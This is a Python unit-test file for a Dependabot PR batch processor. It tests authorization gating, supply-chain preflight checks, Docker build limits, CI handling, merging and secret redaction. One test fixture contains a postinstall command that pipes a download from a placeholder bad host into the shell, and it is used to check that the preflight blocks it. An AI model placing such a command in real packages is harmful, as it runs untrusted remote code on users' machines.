#!/usr/bin/env python3
"""Focused unit tests for the deterministic Dependabot batch components."""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from types import SimpleNamespace


ROOT = Path(__file__).resolve().parents[4]
SCRIPT_DIR = Path(__file__).resolve().parents[1] / "scripts"
sys.path.insert(0, str(SCRIPT_DIR))
SPEC = importlib.util.spec_from_file_location("batch_process", SCRIPT_DIR / "batch_process.py")
assert SPEC and SPEC.loader
batch = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = batch
SPEC.loader.exec_module(batch)


def sha(letter: str) -> str:
    return letter * 40


def commit(letter: str = "b", *, actor: str = "dependabot[bot]", message: str = "Bump package") -> batch.CommitSnapshot:
    return batch.CommitSnapshot(sha(letter), message, actor, actor)


def pull_request(
    number: int = 1,
    *,
    label: bool = True,
    author: str | None = "dependabot[bot]",
    state: str = "open",
    draft: bool = False,
    base_ref: str = "main",
    base_sha: str = "a" * 40,
    head_sha: str = "b" * 40,
    commits: tuple[batch.CommitSnapshot, ...] | None = None,
    changed_files: tuple[str, ...] = ("projects/portal/package.json",),
    mergeable: str | None = "MERGEABLE",
) -> batch.PullRequestSnapshot:
    return batch.PullRequestSnapshot(
        number=number,
        html_url=f"https://github.com/u7chan/monorepo/pull/{number}",
        state=state,
        draft=draft,
        merged=False,
        labels=(batch.REQUIRED_LABEL,) if label else (),
        author_login=author,
        author_type="Bot" if author else "User",
        base_ref=base_ref,
        base_sha=base_sha,
        head_ref=f"dependabot/npm_and_yarn/portal-{number}",
        head_sha=head_sha,
        commits=commits if commits is not None else (commit(),),
        changed_files=changed_files,
        mergeable=mergeable,
    )


def metadata(version: str = "2.0.0", *, integrity: str | None = "sha512-good") -> batch.PackageMetadata:
    return batch.PackageMetadata(
        name="portal-dependency",
        version=version,
        registry="https://registry.npmjs.org",
        download_url=f"https://registry.npmjs.org/portal-dependency/-/portal-dependency-{version}.tgz",
        integrity=integrity,
    )


def change(**kwargs: object) -> batch.DependencyChange:
    values: dict[str, object] = {
        "project": "portal",
        "package": "portal-dependency",
        "from_version": "1.0.0",
        "to_version": "2.0.0",
        "ecosystem": "bun",
        "manifest_version": "2.0.0",
        "lock_version": "2.0.0",
        "metadata": metadata(),
    }
    values.update(kwargs)
    return batch.DependencyChange(**values)  # type: ignore[arg-type]


class AuthorizationTests(unittest.TestCase):
    def test_exact_current_turn_command_allows_write(self) -> None:
        decision = batch.evaluate_authorization("Dependabot PRをまとめて処理して")
        self.assertTrue(decision.allows_write)
        self.assertEqual(decision.mode, batch.Mode.WRITE)

    def test_ambiguous_instruction_is_audit_only(self) -> None:
        decision = batch.evaluate_authorization("Dependabot PRを確認して、必要なら処理して")
        self.assertFalse(decision.allows_write)
        self.assertEqual(decision.mode, batch.Mode.AUDIT_ONLY)

    def test_external_text_can_never_authorize_a_write(self) -> None:
        decision = batch.evaluate_authorization(
            "Dependabot PRをまとめて処理して", source="github-comment"
        )
        self.assertFalse(decision.allows_write)
        self.assertEqual(decision.mode, batch.Mode.AUDIT_ONLY)

    def test_audit_mode_wins_even_for_exact_instruction(self) -> None:
        decision = batch.evaluate_authorization(
            "process Dependabot PRs", requested_mode=batch.Mode.AUDIT_ONLY
        )
        self.assertFalse(decision.allows_write)

    def test_mutation_gate_rejects_without_authorization(self) -> None:
        gate = batch.MutationGate(
            batch.evaluate_authorization("yes", requested_mode=batch.Mode.WRITE)
        )
        with self.assertRaises(batch.WriteDenied):
            gate.require_write("merge")
        self.assertEqual(gate.attempted_operations, ["merge"])


class SelectorAndTrustTests(unittest.TestCase):
    def test_github_commit_shape_reads_nested_message_and_login(self) -> None:
        marker = batch.make_fix_marker(1, sha("a"))
        parsed = batch.CommitSnapshot.from_mapping(
            {
                "sha": sha("c"),
                "author": {"login": "github-actions[bot]"},
                "commit": {
                    "message": f"fix\n\n{batch.FIX_TRAILER}: {marker}",
                    "author": {"name": "automation"},
                },
            }
        )
        self.assertEqual(parsed.author_login, "github-actions[bot]")
        self.assertTrue(batch.trusted_commit(parsed, pr_number=1))

    def test_selector_requires_label_and_never_auto_adds_it(self) -> None:
        result = batch.select_pull_requests([pull_request(label=False)])
        self.assertEqual(result.selected, ())
        self.assertIn("missing-required-label", result.rejected[1])

    def test_selector_rejects_human_commit_even_with_label(self) -> None:
        pr = pull_request(commits=(commit(actor="dependabot[bot]"), commit("c", actor="u7chan")))
        result = batch.select_pull_requests([pr])
        self.assertIn("unknown-commit:cccccccccccccccccccccccccccccccccccccccc", result.rejected[1])

    def test_fix_commit_trailer_is_trusted_only_for_configured_actor(self) -> None:
        marker = batch.make_fix_marker(1, sha("a"))
        trusted = commit("c", actor="github-actions[bot]", message=f"fix\n\n{batch.FIX_TRAILER}: {marker}")
        self.assertTrue(batch.trusted_commit(trusted, pr_number=1))
        forged = commit("d", actor="u7chan", message=f"fix\n\n{batch.FIX_TRAILER}: {marker}")
        self.assertFalse(batch.trusted_commit(forged, pr_number=1))

    def test_selector_rejects_draft_non_default_and_closed_pr(self) -> None:
        result = batch.select_pull_requests(
            [pull_request(draft=True, base_ref="release", state="closed")]
        )
        reasons = result.rejected[1]
        self.assertIn("draft", reasons)
        self.assertIn("non-default-base", reasons)
        self.assertIn("not-open", reasons)

    def test_snapshot_requires_complete_commit_history(self) -> None:
        pr = pull_request()
        incomplete = batch.PullRequestSnapshot(**{**pr.__dict__, "commits_complete": False})
        result = batch.select_pull_requests([incomplete])
        self.assertIn("commit-history-unavailable", result.rejected[1])


class SupplyChainAndOrderingTests(unittest.TestCase):
    def test_metadata_failure_is_retried_twice_then_unknown(self) -> None:
        calls: list[tuple[str, str]] = []

        def fetch(package_name: str, version: str) -> batch.PackageMetadata:
            calls.append((package_name, version))
            raise batch.MetadataUnavailable("registry unavailable")

        result = batch.SupplyChainPreflight(fetch).check(change(metadata=None))
        self.assertEqual(result.status, batch.PreflightStatus.UNKNOWN)
        self.assertEqual(result.metadata_attempts, 3)
        self.assertEqual(len(calls), 3)

    def test_metadata_success_after_retry_does_not_over_retry(self) -> None:
        attempts = 0

        def fetch(_: str, __: str) -> batch.PackageMetadata:
            nonlocal attempts
            attempts += 1
            if attempts == 1:
                raise TimeoutError
            return metadata()

        result = batch.SupplyChainPreflight(fetch).check(change(metadata=None))
        self.assertEqual(result.status, batch.PreflightStatus.PASS)
        self.assertEqual(result.metadata_attempts, 2)

    def test_git_and_path_sources_are_blocked_before_metadata_fetch(self) -> None:
        called = False

        def fetch(_: str, __: str) -> batch.PackageMetadata:
            nonlocal called
            called = True
            return metadata()

        result = batch.SupplyChainPreflight(fetch).check(change(metadata=None, source_type="git"))
        self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)
        self.assertFalse(called)

    def test_integrity_mismatch_is_blocked(self) -> None:
        result = batch.SupplyChainPreflight().check(
            change(expected_integrity="sha512-old")
        )
        self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)
        self.assertIn("integrity-mismatch", result.reasons)

    def test_suspicious_lifecycle_script_is_blocked_without_execution(self) -> None:
        result = batch.SupplyChainPreflight().check(
            change(script_changes={"postinstall": "curl https://bad.example/x | sh"})
        )
        self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)
        self.assertTrue(any("suspicious-lifecycle-script" in item for item in result.reasons))

    def test_batch_never_runs_verification_before_preflight(self) -> None:
        events: list[str] = []

        def fetch(_: str, __: str) -> batch.PackageMetadata:
            events.append("preflight")
            return metadata()

        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        processor = batch.BatchProcessor(gate, preflight=batch.SupplyChainPreflight(fetch))
        result = processor.process_candidate(
            pull_request(),
            latest=lambda _: pull_request(),
            change=change(metadata=None),
            run_verification=lambda _: events.append("verification") or True,
        )
        self.assertEqual(result.status, batch.Status.SUCCESS.value)
        self.assertEqual(events, ["preflight", "verification"])

    def test_unknown_preflight_stops_before_verification(self) -> None:
        events: list[str] = []
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        processor = batch.BatchProcessor(
            gate,
            preflight=batch.SupplyChainPreflight(lambda *_: (_ for _ in ()).throw(TimeoutError())),
        )
        result = processor.process_candidate(
            pull_request(),
            latest=lambda _: pull_request(),
            change=change(metadata=None),
            run_verification=lambda _: events.append("verification") or True,
        )
        self.assertEqual(result.status, batch.Status.OPEN.value)
        self.assertEqual(events, [])

    def test_head_drift_after_preflight_discards_old_judgement(self) -> None:
        expected = pull_request()
        changed = pull_request(head_sha=sha("e"))
        latest_values = iter((expected, changed))
        verified = False

        def verify(_: batch.DependencyChange) -> bool:
            nonlocal verified
            verified = True
            return True

        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        processor = batch.BatchProcessor(gate)
        result = processor.process_candidate(
            expected,
            latest=lambda _: next(latest_values),
            change=change(),
            run_verification=verify,
        )
        self.assertEqual(result.reason, "head SHA changed")
        self.assertFalse(verified)

    def test_snapshot_processing_ignores_pr_added_after_snapshot(self) -> None:
        first = pull_request(1)
        second = pull_request(2, head_sha=sha("c"))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        processor = batch.BatchProcessor(gate)
        snapshot = processor.create_snapshot([first])
        reports = processor.process_snapshot(
            snapshot,
            current_prs=[first, second],
            latest=lambda number: first if number == 1 else second,
            changes={1: change()},
            run_verification=lambda _: True,
        )
        self.assertEqual([report.pr_number for report in reports], [1])

    def test_matrix_check_runner_uses_declared_cwd_and_timeout(self) -> None:
        raw = json.loads(
            (ROOT / ".agents/skills/dependabot-pr-batch-process/verification-matrix.json").read_text(
                encoding="utf-8"
            )
        )
        matrix = batch.VerificationMatrix.from_mapping(raw)
        seen: list[tuple[tuple[str, ...], Path, int]] = []

        class Runner:
            def run(self, argv, *, cwd, timeout_seconds, env=None):  # type: ignore[no-untyped-def]
                seen.append((tuple(argv), cwd, timeout_seconds))
                return SimpleNamespace(returncode=0)

        results = batch.MatrixCheckRunner(Runner(), ROOT).run_project(matrix.projects["portal"])
        self.assertEqual([result.status for result in results], ["not-required", "passed", "passed", "passed"])
        self.assertTrue(batch.verification_passed(results))
        self.assertEqual(seen[0][1], (ROOT / "projects/portal").resolve())


class MatrixAndDockerTests(unittest.TestCase):
    MATRIX_PATH = ROOT / ".agents/skills/dependabot-pr-batch-process/verification-matrix.json"

    def test_repository_matrix_covers_dependabot_config(self) -> None:
        raw = json.loads(self.MATRIX_PATH.read_text(encoding="utf-8"))
        matrix = batch.VerificationMatrix.from_mapping(raw)
        errors = batch.validate_repository_matrix(
            matrix,
            repository_root=ROOT,
            dependabot_config=ROOT / ".github/dependabot.yml",
        )
        self.assertEqual(errors, [])
        self.assertEqual(matrix.max_docker_concurrency, 2)

    def test_missing_required_docker_target_is_not_fallback_success(self) -> None:
        raw = {
            "version": 1,
            "docker": {"max_concurrency": 2, "default_timeout_seconds": 60},
            "projects": {
                "example": {
                    "path": "projects/example",
                    "ecosystem": "bun",
                    "checks": [
                        {"id": "test", "kind": "test", "required": True, "argv": ["bun", "test"], "timeout_seconds": 60}
                    ],
                    "docker": {
                        "test": {"target": "test", "required": True, "timeout_seconds": 60},
                        "final": {"target": "final", "required": False, "timeout_seconds": 60},
                    },
                }
            },
        }
        matrix = batch.VerificationMatrix.from_mapping(raw)
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            project = root / "projects/example"
            project.mkdir(parents=True)
            (project / "Dockerfile").write_text("FROM alpine AS final\n", encoding="utf-8")
            with self.assertRaises(batch.MatrixError):
                batch.docker_specs_for_project(matrix, "example", repository_root=root, commit_sha=sha("a"))

    def test_optional_missing_test_target_is_skipped_not_passed(self) -> None:
        raw = json.loads(self.MATRIX_PATH.read_text(encoding="utf-8"))
        matrix = batch.VerificationMatrix.from_mapping(raw)
        specs = batch.docker_specs_for_project(
            matrix, "edit-vid", repository_root=ROOT, commit_sha=sha("a")
        )
        self.assertEqual([spec.stage for spec in specs], ["final"])

    def test_docker_runner_has_max_two_active_builds_and_cleans_exact_images(self) -> None:
        lock = threading.Lock()
        active = 0
        max_active = 0
        commands: list[tuple[str, ...]] = []

        class Runner:
            def run(self, argv, *, cwd, timeout_seconds, env=None):  # type: ignore[no-untyped-def]
                nonlocal active, max_active
                with lock:
                    active += 1
                    max_active = max(max_active, active)
                    commands.append(tuple(argv))
                time.sleep(0.02)
                with lock:
                    active -= 1
                return SimpleNamespace(returncode=0)

        class Cleaner:
            def __init__(self) -> None:
                self.images: list[str] = []

            def remove_image(self, tag: str) -> None:
                self.images.append(tag)

            def remove_worktree(self, path: Path) -> None:
                raise AssertionError("no worktree was tracked")

        cleaner = Cleaner()
        docker = batch.DockerBatchRunner(Runner(), cleaner, repository_root=ROOT)
        specs = tuple(
            batch.DockerBuildSpec("portal", "projects/portal", stage, f"batch/{stage}:{index}", sha("a"), 30)
            for index, stage in enumerate(("test", "final", "test", "final"))
        )
        results = docker.run(specs)
        self.assertEqual(max_active, 2)
        self.assertEqual([result.status for result in results], ["passed"] * 4)
        self.assertEqual(sorted(cleaner.images), sorted(spec.image_tag for spec in specs))
        self.assertTrue(all("--mount" not in command and "--secret" not in command for command in commands))
        self.assertFalse(any("system" in command and "prune" in command for command in commands))

    def test_docker_timeout_isolated_and_cleanup_still_runs(self) -> None:
        class Runner:
            def run(self, argv, *, cwd, timeout_seconds, env=None):  # type: ignore[no-untyped-def]
                raise subprocess.TimeoutExpired(argv, timeout_seconds)

        class Cleaner:
            def __init__(self) -> None:
                self.images: list[str] = []

            def remove_image(self, tag: str) -> None:
                self.images.append(tag)

            def remove_worktree(self, path: Path) -> None:
                pass

        spec = batch.DockerBuildSpec("portal", "projects/portal", "test", "batch/timeout:1", sha("a"), 1)
        cleaner = Cleaner()
        result = batch.DockerBatchRunner(Runner(), cleaner, repository_root=ROOT).run((spec,))[0]
        self.assertEqual(result.status, "timeout")
        self.assertEqual(cleaner.images, [spec.image_tag])

    def test_concurrency_three_is_rejected(self) -> None:
        with self.assertRaises(batch.MatrixError):
            batch.DockerBatchRunner(SimpleNamespace(), SimpleNamespace(), repository_root=ROOT, max_concurrency=3)


class FootprintAndCITests(unittest.TestCase):
    def test_independent_projects_share_a_wave(self) -> None:
        items = [
            batch.FootprintedItem(1, batch.footprint_for_paths(["projects/portal/src/a.ts"])),
            batch.FootprintedItem(2, batch.footprint_for_paths(["projects/portfolio/src/a.ts"])),
            batch.FootprintedItem(3, batch.footprint_for_paths(["projects/portal/src/b.ts"])),
        ]
        waves = batch.schedule_footprints(items)
        self.assertEqual([[item.identifier for item in wave] for wave in waves], [[1, 2], [3]])

    def test_global_footprint_serializes_with_everything(self) -> None:
        items = [
            batch.FootprintedItem(1, batch.footprint_for_paths(["projects/portal/x"])),
            batch.FootprintedItem(2, batch.footprint_for_paths([".github/workflows/x.yml"])),
            batch.FootprintedItem(3, batch.footprint_for_paths(["projects/portfolio/x"])),
        ]
        waves = batch.schedule_footprints(items)
        self.assertEqual([[item.identifier for item in wave] for wave in waves], [[1], [2], [3]])

    def test_ci_success_and_dependency_classification(self) -> None:
        checks = (batch.CheckObservation("ci", "completed", "success"),)
        self.assertEqual(
            batch.classify_ci(batch.CIObservation(sha("a"), checks), expected_head_sha=sha("a")),
            batch.CIClassification.SUCCESS,
        )
        self.assertEqual(
            batch.classify_ci(
                batch.CIObservation(
                    sha("a"),
                    (batch.CheckObservation("ci", "completed", "failure"),),
                    main_success=True,
                    pr_reproducible=True,
                    dependency_causation=True,
                ),
                expected_head_sha=sha("a"),
            ),
            batch.CIClassification.DEPENDENCY_CAUSED,
        )

    def test_ci_waiter_retries_transient_once(self) -> None:
        class Clock:
            def __init__(self) -> None:
                self.now = 0.0

            def monotonic(self) -> float:
                return self.now

            def sleep(self, seconds: float) -> None:
                self.now += seconds

        observations = iter(
            (
                batch.CIObservation(sha("a"), (batch.CheckObservation("ci", "completed", "failure"),), failure_code="runner-failure"),
                batch.CIObservation(sha("a"), (batch.CheckObservation("ci", "completed", "success"),)),
            )
        )
        reruns: list[int] = []
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        result = batch.CIWaiter(Clock()).wait(
            sha("a"), lambda _: next(observations), lambda _: reruns.append(1), gate=gate
        )
        self.assertEqual(result.classification, batch.CIClassification.SUCCESS)
        self.assertEqual(result.reruns, 1)
        self.assertEqual(len(reruns), 1)

    def test_ci_waiter_does_not_rerun_in_audit_mode(self) -> None:
        observation = batch.CIObservation(
            sha("a"),
            (batch.CheckObservation("ci", "completed", "failure"),),
            failure_code="runner-failure",
        )
        reruns: list[int] = []
        gate = batch.MutationGate(batch.evaluate_authorization(None, requested_mode=batch.Mode.AUDIT_ONLY))
        result = batch.CIWaiter().wait(sha("a"), lambda _: observation, lambda _: reruns.append(1), gate=gate)
        self.assertEqual(result.classification, batch.CIClassification.WRITE_NOT_AUTHORIZED)
        self.assertEqual(reruns, [])

    def test_ci_deadline_is_absolute_and_timeout_is_unknown_for_disposition(self) -> None:
        class Clock:
            def __init__(self) -> None:
                self.now = 0.0

            def monotonic(self) -> float:
                return self.now

            def sleep(self, seconds: float) -> None:
                self.now += seconds

        running = batch.CIObservation(sha("a"), (batch.CheckObservation("ci", "in_progress"),))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        result = batch.CIWaiter(Clock(), poll_seconds=10, deadline_seconds=25).wait(
            sha("a"), lambda _: running, lambda _: None, gate=gate
        )
        self.assertEqual(result.classification, batch.CIClassification.TIMEOUT)
        self.assertEqual(batch.disposition_for(classification=result.classification.value), "open")


class CycleMergeAndTOCTOUTests(unittest.TestCase):
    def test_repair_controller_is_bounded_at_two_cycles(self) -> None:
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        controller = batch.RepairCycleController(gate)
        commits: list[batch.FixCommit] = []

        def create(diagnosis: batch.RepairDiagnosis, marker: str, message: str) -> batch.FixCommit:
            return batch.FixCommit(sha("c" if not commits else "d"), message, marker)

        def push(_: str, new: batch.FixCommit) -> None:
            commits.append(new)

        result = controller.run(
            pr_number=1,
            initial_head_sha=sha("a"),
            current_head=lambda: commits[-1].sha if commits else sha("a"),
            diagnose=lambda cycle, _: batch.RepairDiagnosis(True, True, f"fix {cycle}"),
            create_commit=create,
            push=push,
            wait_for_ci=lambda _: batch.CIResult(batch.CIClassification.DEPENDENCY_CAUSED, "still fails", sha("a")),
        )
        self.assertEqual(result.cycles, 2)
        self.assertEqual(len(result.commits), 2)
        self.assertEqual(result.reason, "maximum-two-cycles-reached")

    def test_repair_controller_does_not_commit_after_head_drift(self) -> None:
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        calls: list[str] = []
        result = batch.RepairCycleController(gate).run(
            pr_number=1,
            initial_head_sha=sha("a"),
            current_head=lambda: sha("b"),
            diagnose=lambda *_: calls.append("diagnose") or batch.RepairDiagnosis(True, True, "fix"),
            create_commit=lambda *_: (_ for _ in ()).throw(AssertionError("must not commit")),
            push=lambda *_: None,
            wait_for_ci=lambda _: (_ for _ in ()).throw(AssertionError("must not wait")),
        )
        self.assertEqual(result.reason, "head-drift-before-fix")
        self.assertEqual(calls, [])

    def test_repair_controller_has_no_write_in_audit_mode(self) -> None:
        gate = batch.MutationGate(batch.evaluate_authorization(None, requested_mode=batch.Mode.AUDIT_ONLY))
        calls: list[str] = []
        result = batch.RepairCycleController(gate).run(
            pr_number=1,
            initial_head_sha=sha("a"),
            current_head=lambda: sha("a"),
            diagnose=lambda *_: batch.RepairDiagnosis(True, True, "fix"),
            create_commit=lambda *_: calls.append("commit") or batch.FixCommit(sha("c"), "bad", "bad"),
            push=lambda *_: calls.append("push"),
            wait_for_ci=lambda _: batch.CIResult(batch.CIClassification.SUCCESS, "ok", sha("c")),
        )
        self.assertEqual(result.reason, "write-not-authorized")
        self.assertEqual(calls, [])

    def test_expected_sha_gate_blocks_action_on_drift(self) -> None:
        expected = pull_request()
        current = pull_request(head_sha=sha("e"))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        called: list[str] = []
        with self.assertRaises(batch.SnapshotDrift):
            batch.ExpectedSHAWriter(gate).run(
                "merge",
                expected,
                lambda: current,
                lambda *_: called.append("action"),
            )
        self.assertEqual(called, [])

    def test_expected_sha_gate_blocks_action_on_base_drift(self) -> None:
        expected = pull_request()
        current = pull_request(base_sha=sha("e"))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        with self.assertRaises(batch.SnapshotDrift):
            batch.ExpectedSHAWriter(gate).run(
                "push-fix",
                expected,
                lambda: current,
                lambda *_: None,
            )

    def test_serial_merge_waits_for_cd_before_second_merge(self) -> None:
        prs = (pull_request(2), pull_request(1, head_sha=sha("c")))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        current = {pr.number: pr for pr in prs}
        merge_calls: list[int] = []
        cd_calls: list[str] = []
        result = batch.SerialMerger(gate).merge_in_order(
            prs,
            refetch=lambda number: current[number],
            ci_success_for_head=lambda _: True,
            merge=lambda head: merge_calls.append(1) or sha("f"),
            wait_for_cd=lambda merged_sha: cd_calls.append(merged_sha) or True,
        )
        self.assertEqual([item.pr_number for item in result], [1, 2])
        self.assertEqual(len(merge_calls), 2)
        self.assertEqual(cd_calls, [sha("f"), sha("f")])

    def test_cd_failure_stops_later_merges_without_revert(self) -> None:
        prs = (pull_request(1), pull_request(2, head_sha=sha("c")))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        merged: list[int] = []
        result = batch.SerialMerger(gate).merge_in_order(
            prs,
            refetch=lambda number: prs[number - 1],
            ci_success_for_head=lambda _: True,
            merge=lambda _: merged.append(1) or sha("f"),
            wait_for_cd=lambda _: False,
        )
        self.assertEqual(len(merged), 1)
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].reason, "cd-failed-or-timeout")


class IdempotencyIssueAndAuditTests(unittest.TestCase):
    def test_state_is_reconstructed_from_github_records(self) -> None:
        pr = pull_request()
        fix_marker = batch.make_fix_marker(1, pr.head_sha)
        pr = batch.PullRequestSnapshot(
            **{
                **pr.__dict__,
                "commits": (
                    commit(
                        "c",
                        actor="github-actions[bot]",
                        message=f"fix\n\n{batch.FIX_TRAILER}: {fix_marker}",
                    ),
                ),
            }
        )
        marker = batch.make_idempotency_marker("portal", "pkg", "1", "2")
        state = batch.reconstruct_state(
            pr,
            comments=[batch.CommentRecord(1, batch.embed_marker("comment", marker))],
            issues=[batch.IssueRecord(2, "open", batch.embed_marker("issue", marker))],
        )
        self.assertEqual(state.fix_markers, (fix_marker,))
        self.assertEqual(state.comment_markers, (marker,))
        self.assertEqual(state.issue_markers, (marker,))

    def test_marker_comment_updates_instead_of_creating_duplicate(self) -> None:
        marker = batch.make_idempotency_marker("portal", "pkg", "1", "2")
        existing = batch.CommentRecord(10, batch.embed_marker("old", marker))
        plan = batch.plan_idempotent_comment(marker, "new", [existing])
        self.assertEqual(plan.action, "update")
        self.assertEqual(plan.comment_id, 10)
        self.assertEqual(batch.marker_in_body(plan.body, marker), True)

    def test_reconstruct_issue_reuses_open_and_references_closed(self) -> None:
        marker = batch.make_idempotency_marker("portal", "pkg", "1", "2")
        open_issue = batch.IssueRecord(8, "open", batch.embed_marker("open", marker))
        closed_issue = batch.IssueRecord(9, "closed", batch.embed_marker("closed", marker))
        self.assertEqual(batch.plan_followup_issue(marker, [open_issue]).action, "reuse-open")
        self.assertEqual(batch.plan_followup_issue(marker, [closed_issue]).action, "reference-closed")
        self.assertEqual(batch.plan_followup_issue(marker, []).action, "create")

    def test_followup_issue_manager_reuses_closed_and_rechecks_after_create(self) -> None:
        marker = batch.make_idempotency_marker("portal", "pkg", "1", "2")
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))

        class Writer:
            def __init__(self) -> None:
                self.created = 0

            def create(self, body: str) -> batch.IssueRecord:
                self.created += 1
                return batch.IssueRecord(10, "open", body, "https://github.com/issues/10")

            def update(self, number: int, body: str) -> batch.IssueRecord:
                return batch.IssueRecord(number, "open", body)

        writer = Writer()
        records: list[batch.IssueRecord] = []

        def search() -> list[batch.IssueRecord]:
            return records.copy()

        # A real writer would make the record visible to the second search;
        # model that boundary here.
        original_create = writer.create

        def create_and_publish(body: str) -> batch.IssueRecord:
            issue = original_create(body)
            records.append(issue)
            return issue

        writer.create = create_and_publish  # type: ignore[method-assign]
        plan = batch.FollowupIssueManager(gate).ensure(
            marker,
            batch.embed_marker("body", marker),
            search_all=search,
            writer=writer,
        )
        self.assertEqual(plan.action, "created")
        self.assertEqual(writer.created, 1)
        closed = batch.IssueRecord(11, "closed", batch.embed_marker("closed", marker))
        records[:] = [closed]
        plan = batch.FollowupIssueManager(gate).ensure(
            marker,
            closed.body,
            search_all=search,
            writer=writer,
        )
        self.assertEqual(plan.action, "reference-closed")
        self.assertEqual(writer.created, 1)

    def test_disposition_executor_comments_before_close_and_stops_on_second_drift(self) -> None:
        expected = pull_request()
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        calls: list[str] = []
        latest = iter((expected, pull_request(head_sha=sha("e"))))
        result = batch.DispositionExecutor(gate).apply(
            expected,
            disposition="close",
            read_current=lambda: next(latest),
            comment=lambda _: calls.append("comment"),
            close=lambda _: calls.append("close"),
            comment_body="理由",
        )
        self.assertEqual(result, "open")
        self.assertEqual(calls, ["comment"])

    def test_close_only_for_reproducible_dependency_or_clear_supply_chain_refusal(self) -> None:
        self.assertEqual(
            batch.disposition_for(classification="dependency-incompatibility"), "close"
        )
        self.assertEqual(
            batch.disposition_for(
                classification="external/unknown",
                preflight=batch.PreflightResult(batch.PreflightStatus.BLOCKED, ("unexpected-registry",)),
            ),
            "close",
        )
        self.assertEqual(batch.disposition_for(classification="timeout"), "open")
        self.assertEqual(batch.disposition_for(classification="external/unknown", push_allowed=False), "open")

    def test_audit_aggregation_redacts_secrets_and_does_not_include_raw_log(self) -> None:
        aggregator = batch.AuditAggregator()
        aggregator.add(
            batch.AuditRecord(
                1,
                "https://github.com/u7chan/monorepo/pull/1?token=secret-value",
                sha("a"),
                sha("b"),
                "open",
                "Bearer ghp_abcdefghijklmnopqrstuvwxyz0123456789",
                check_urls=("https://github.com/run/1?api_key=secret",),
                remaining="password=secret-value",
            )
        )
        rendered = aggregator.render_markdown()
        self.assertNotIn("secret-value", rendered)
        self.assertNotIn("ghp_abcdefghijklmnopqrstuvwxyz0123456789", rendered)
        self.assertNotIn("raw log", rendered)
        self.assertIn("[REDACTED]", rendered)


if __name__ == "__main__":
    unittest.main()
